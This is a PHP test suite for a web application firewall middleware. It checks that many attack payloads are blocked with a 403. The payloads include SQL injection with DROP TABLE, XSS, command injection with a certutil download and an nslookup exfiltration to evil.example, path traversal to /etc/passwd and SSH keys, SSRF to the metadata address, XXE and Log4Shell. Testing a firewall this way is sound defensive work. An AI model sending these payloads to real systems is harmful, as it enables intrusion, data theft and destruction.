<?php

declare(strict_types=1);

namespace Prowendi\HyperfHttpWaf\Tests;

use Prowendi\HyperfHttpWaf\Tests\Stubs\OkHandler;
use Nyholm\Psr7\ServerRequest;

/**
 * Red-team regression suite: every case here is a known bypass technique that
 * must be blocked in enforce (block) mode.
 */
final class WafBypassTest extends TestCase
{
    /**
     * @return iterable<string, list<string>>
     */
    public static function sqliProvider(): iterable
    {
        yield 'string tautology' => ["' OR 'a'='a' --"];
        yield 'double-quoted tautology' => ['1 OR "b"="b"'];
        yield 'quote comment dash' => ["admin'--"];
        yield 'quote comment hash' => ["admin'#"];
        yield 'quote comment block' => ["admin'/*"];
        yield 'mysql sleep' => ["1' AND SLEEP(5)--"];
        yield 'mssql waitfor' => ["1; WAITFOR DELAY '0:5'--"];
        yield 'postgres pg_sleep' => ["1; SELECT pg_sleep(5)--"];
        yield 'stacked drop' => ["1'; DROP TABLE users--"];
        yield 'stacked insert' => ["1'; INSERT INTO logs VALUES('x')--"];
        yield 'union newline select' => ["1 union%0aselect password,email,display_name_label from users"];
        yield 'union select long gap' => ['1 union select password,email_address,display_name,bio from users'];
    }

    /**
     * @dataProvider sqliProvider
     */
    public function testSqlInjectionVariantsAreBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/search', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['q' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    public function testSqlInjectionInCookieIsBlocked(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/', ['user-agent' => 'Mozilla/5.0'])
            ->withCookieParams(['session' => "' OR 'a'='a' --"]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function xssProvider(): iterable
    {
        yield 'details ontoggle' => ['<details open ontoggle=alert(1)>'];
        yield 'svg animate onbegin' => ['<svg><animate onbegin=alert(1) attributeName=x dur=1s>'];
        yield 'body onpageshow' => ['<body onpageshow=alert(1)>'];
        yield 'input onfocus' => ['<input autofocus onfocus=alert(1)>'];
        yield 'marquee onstart' => ['<marquee onstart=alert(1)>x</marquee>'];
        yield 'javascript scheme with tab entity' => ['<a href="jav&#x09;ascript:alert(1)">click</a>'];
        yield 'javascript scheme with newline entity' => ['<a href="jav&#x0a;ascript:alert(1)">click</a>'];
        yield 'data text html uri' => ['<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>'];
        yield 'img onerror baseline' => ['<img src=x onerror=alert(1)>'];
    }

    /**
     * @dataProvider xssProvider
     */
    public function testXssVariantsAreBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/comment', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['content' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function rceProvider(): iterable
    {
        yield 'semicolon whoami' => ['; whoami'];
        yield 'dollar paren id' => ['$(whoami)'];
        yield 'backtick command' => ['`whoami`'];
        yield 'pipe uname' => ['| uname -a'];
        yield 'newline command' => ["%0a|whoami"];
        yield 'certutil download' => ['; certutil -urlcache -f http://evil.example/x x.exe'];
        yield 'powershell exec' => ['; powershell -c whoami'];
        yield 'nslookup exfil' => ['; nslookup oob.evil.example'];
    }

    /**
     * @dataProvider rceProvider
     */
    public function testRceVariantsAreBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/ping', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['host' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function traversalProvider(): iterable
    {
        yield 'dot dot semicolon' => ['..;/config/settings.ini'];
        yield 'dot dot semicolon encoded' => ['..%3b/config/settings.ini'];
        yield 'mixed encoding traversal' => ['.%2e/.%2e/app/config.yaml'];
        yield 'plain traversal baseline' => ['../../etc/passwd'];
    }

    /**
     * @dataProvider traversalProvider
     */
    public function testTraversalVariantsAreBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = $this->createRequest('GET', '/download', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['file' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function lfiProvider(): iterable
    {
        yield 'etc dot slash passwd' => ['/etc/./passwd'];
        yield 'etc double slash passwd' => ['/etc//passwd'];
        yield 'php filter wrapper' => ['php://filter/convert.base64-encode/resource=index.php'];
        yield 'php input wrapper' => ['php://input'];
        yield 'ssh key path' => ['.ssh/id_rsa'];
        yield 'etc passwd baseline' => ['/etc/passwd'];
    }

    /**
     * @dataProvider lfiProvider
     */
    public function testLfiVariantsAreBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = $this->createRequest('GET', '/render', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['tpl' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    /**
     * @return iterable<string, list<string>>
     */
    public static function ssrfProvider(): iterable
    {
        yield 'ipv6 loopback' => ['http://[::1]:8080/api'];
        yield 'hex ip' => ['http://0x7f000001/api'];
        yield 'decimal ip' => ['http://2130706433/api'];
        yield 'octal ip' => ['http://0177.0.0.1/api'];
        yield 'short loopback' => ['http://127.1/api'];
        yield 'ipv4 mapped ipv6' => ['http://[::ffff:127.0.0.1]/api'];
        yield 'metadata baseline' => ['http://169.254.169.254/latest/meta-data/'];
    }

    /**
     * @dataProvider ssrfProvider
     */
    public function testSsrfVariantsAreBlocked(string $payload): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/fetch', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['url' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    public function testBodyWithoutContentTypeIsScanned(): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = new ServerRequest('POST', '/submit', ['user-agent' => 'Mozilla/5.0'], '1 union select password from users');

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testBinaryContentTypeBodyIsScanned(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('POST', '/submit', [
            'content-type' => 'application/octet-stream',
            'user-agent' => 'Mozilla/5.0',
        ], '<script>alert(1)</script>');

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testJsonBodyIsScanned(): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = $this->createRequest('POST', '/api/search', [
            'content-type' => 'application/json',
            'user-agent' => 'Mozilla/5.0',
        ], '{"q":"1 union select password from users"}');

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testUserAgentPayloadIsScanned(): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = $this->createRequest('GET', '/', [
            'user-agent' => 'Mozilla/5.0 1 union select password from users',
        ]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testRefererPayloadIsScanned(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/', [
            'user-agent' => 'Mozilla/5.0',
            'referer' => 'http://evil.example/<script>alert(1)</script>',
        ]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testOversizedValueTailIsScanned(): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $payload = str_repeat('a', 5000) . "' OR 'a'='a' --";

        $request = $this->createRequest('GET', '/search', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['q' => $payload]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testEncodedPathCannotEvadeWhitelist(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'whitelist' => ['paths' => ['/api/*']],
        ]);

        $request = $this->createRequest('GET', '/api/%2e%2e/.env', ['user-agent' => 'Mozilla/5.0']);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testNoSqlOperatorInParamNameIsBlocked(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('POST', '/login', [
            'content-type' => 'application/x-www-form-urlencoded',
            'user-agent' => 'Mozilla/5.0',
        ])->withParsedBody([
            'username' => ['$ne' => 'x'],
            'password' => ['$regex' => '^adm'],
        ]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testXxePayloadIsBlocked(): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>';

        $request = $this->createRequest('POST', '/import', [
            'content-type' => 'application/xml',
            'user-agent' => 'Mozilla/5.0',
        ], $payload);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testLog4ShellPayloadIsBlocked(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/lookup', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['q' => '${jndi:ldap://evil.example/a}']);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testPhpDeserializePayloadIsBlocked(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/cache', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['key' => 'O:8:"stdClass":1:{s:1:"a";i:1;}']);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testCrlfHeaderInjectionIsBlocked(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/redirect', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['next' => "%0d%0aSet-Cookie: admin=1"]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testOracleConcatInjectionIsBlocked(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 40],
        ]);

        $request = $this->createRequest('GET', '/login', ['user-agent' => 'Mozilla/5.0'])
            ->withQueryParams(['u' => "'||(SELECT '' FROM dual)||'"]);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode());
    }
}
